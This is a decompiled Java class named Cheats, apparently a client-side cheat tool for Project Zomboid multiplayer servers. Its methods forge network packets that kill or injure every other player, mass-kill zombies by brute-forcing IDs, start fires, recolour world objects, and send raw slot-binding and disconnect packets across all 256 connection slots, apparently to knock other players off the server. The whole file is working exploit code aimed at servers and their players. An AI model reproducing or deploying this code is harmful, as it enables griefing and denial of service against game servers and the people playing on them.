// 
// Decompiled by Procyon v0.5.36
// 

package dev.zomboid.admin;

import zombie.core.raknet.UdpConnection;
import java.io.IOException;
import zombie.iso.IsoGridSquare;
import zombie.iso.IsoObject;
import java.util.concurrent.ThreadLocalRandom;
import zombie.iso.IsoCell;
import zombie.characters.IsoZombie;
import zombie.iso.IsoWorld;
import zombie.characters.BodyDamage.BodyPartType;
import java.util.Iterator;
import zombie.inventory.types.HandWeapon;
import zombie.iso.IsoMovingObject;
import zombie.characters.IsoGameCharacter;
import zombie.core.network.ByteBufferWriter;
import zombie.network.PacketTypes;
import zombie.network.packets.PlayerPacket;
import zombie.network.GameClient;
import zombie.characters.IsoPlayer;

public final class Cheats
{
    public static IsoPlayer primaryPlayer() {
        return GameClient.connection.players[0];
    }
    
    public static void safeTeleport(final IsoPlayer player, final float x, final float y, final float z) {
        final float deltaX = x - player.x;
        final float deltaY = y - player.y;
        final float deltaZ = z - player.z;
        float remX = Math.abs(deltaX);
        float remY = Math.abs(deltaY);
        float remZ = Math.abs(deltaZ);
        while (remX > 0.0f || remY > 0.0f || remZ > 0.0f) {
            float moveX = Math.min(remX, 3.9f);
            float moveY = Math.min(remY, 3.9f);
            float moveZ = Math.min(remZ, 3.9f);
            remX -= moveX;
            remY -= moveY;
            remZ -= moveZ;
            if (deltaX < 0.0f) {
                moveX = -moveX;
            }
            if (deltaY < 0.0f) {
                moveY = -moveY;
            }
            if (deltaZ < 0.0f) {
                moveZ = -moveZ;
            }
            player.setX(player.x + moveX);
            player.setY(player.y + moveY);
            player.setZ(player.z + moveZ);
            player.setLx(player.getX());
            player.setLy(player.getY());
            player.setLz(player.getZ());
            GameClient.instance.sendPlayer(player);
            if (PlayerPacket.l_send.playerPacket.set(player)) {
                final ByteBufferWriter writer = GameClient.connection.startPacket();
                PacketTypes.PacketType.PlayerUpdateReliable.doPacket(writer);
                PlayerPacket.l_send.playerPacket.write(writer);
                PacketTypes.PacketType.PlayerUpdateReliable.send(GameClient.connection);
            }
        }
    }
    
    public static void kill(final IsoPlayer player, final KillType type) {
        final IsoPlayer local = primaryPlayer();
        if (local == null) {
            return;
        }
        switch (type) {
            case LOCAL_DEATH: {
                GameClient.instance.sendPlayerDeath(player);
                break;
            }
            case NORMAL_HIT: {
                GameClient.sendHitCharacter((IsoGameCharacter)local, (IsoMovingObject)player, (HandWeapon)null, 10000.0f, false, 10000.0f, false, false, true);
                break;
            }
        }
    }
    
    public static void killAllPlayers(final KillType type) {
        for (final IsoPlayer p : GameClient.instance.getPlayers()) {
            kill(p, type);
        }
    }
    
    public static void killAllPlayersBrute(final KillType type) {
        for (final IsoPlayer p : GameClient.instance.getPlayers()) {
            kill(p, KillType.LOCAL_DEATH);
        }
    }
    
    public static void damageBody(final IsoPlayer player, final BodyPartType part, final float damage) {
        GameClient.instance.sendAdditionalPain((int)player.OnlineID, part.index(), damage);
    }
    
    public static void damageBodies(final BodyPartType part, final float damage) {
        for (final IsoPlayer p : GameClient.instance.getPlayers()) {
            damageBody(p, part, damage);
        }
    }
    
    public static void killAllZombies() {
        final IsoCell cell = IsoWorld.instance.CurrentCell;
        if (cell != null) {
            for (final IsoZombie z : cell.getZombieList()) {
                GameClient.sendKillZombie(z);
            }
        }
    }
    
    public static void killAllZombiesBruteforce() {
        final IsoZombie z = new IsoZombie((IsoCell)null);
        for (int i = 0; i < 5000; ++i) {
            z.OnlineID = (short)i;
            GameClient.sendKillZombie(z);
        }
    }
    
    public static void rainbowObjects(final IsoPlayer player) {
        final ThreadLocalRandom r = ThreadLocalRandom.current();
        final IsoCell cell = player.getCell();
        if (cell != null) {
            for (final IsoObject object : cell.getObjectList()) {
                if (object.square != null) {
                    object.setCustomColor(r.nextFloat(), r.nextFloat(), r.nextFloat(), r.nextFloat());
                    GameClient.instance.sendCustomColor(object);
                }
            }
        }
    }
    
    public static void addCorpseToMap(final IsoGridSquare square) throws IOException {
        final ByteBufferWriter byteBufferWriter = GameClient.connection.startPacket();
        byteBufferWriter.putByte((byte)(-122));
        for (int i = 0; i < 4; ++i) {
            byteBufferWriter.putByte((byte)ThreadLocalRandom.current().nextInt());
        }
        GameClient.connection.endPacketImmediate();
    }
    
    public static void startFire(final IsoPlayer player, final boolean smoke) {
        final IsoGridSquare square = player.getSquare();
        if (square != null) {
            final ByteBufferWriter byteBufferWriter = GameClient.connection.startPacket();
            PacketTypes.PacketType.StartFire.doPacket(byteBufferWriter);
            byteBufferWriter.putInt(square.getX());
            byteBufferWriter.putInt(square.getY());
            byteBufferWriter.putInt(square.getZ());
            byteBufferWriter.putInt(10000);
            byteBufferWriter.putByte((byte)1);
            byteBufferWriter.putInt(10000);
            byteBufferWriter.putByte((byte)(byte)(smoke ? 1 : 0));
            PacketTypes.PacketType.StartFire.send(GameClient.connection);
        }
    }
    
    public static void bindConnectionSlot(final UdpConnection con, final int slot) {
        final ByteBufferWriter byteBufferWriter = con.startPacket();
        byteBufferWriter.putByte((byte)19);
        byteBufferWriter.putByte((byte)slot);
        con.endPacket(1, 3, (byte)0);
    }
    
    public static void bindConnectionSlots(final UdpConnection con) {
        for (int i = 0; i < 256; ++i) {
            bindConnectionSlot(con, i);
        }
    }
    
    public static void disconnectSlot(final UdpConnection con, final int slot) {
        final ByteBufferWriter byteBufferWriter = con.startPacket();
        byteBufferWriter.putByte((byte)21);
        byteBufferWriter.putByte((byte)slot);
        con.endPacketImmediate();
    }
    
    public static void disconnectSlots(final UdpConnection con) {
        int localId = -1;
        for (final IsoPlayer p : GameClient.instance.getPlayers()) {
            if (p.isLocalPlayer()) {
                localId = p.getOnlineID();
            }
        }
        for (int i = 0; i < 256; ++i) {
            if (i != GameClient.connection.index) {
                disconnectSlot(con, i);
            }
        }
    }
    
    private Cheats() {
        throw new UnsupportedOperationException("This is a utility class and cannot be instantiated");
    }
}
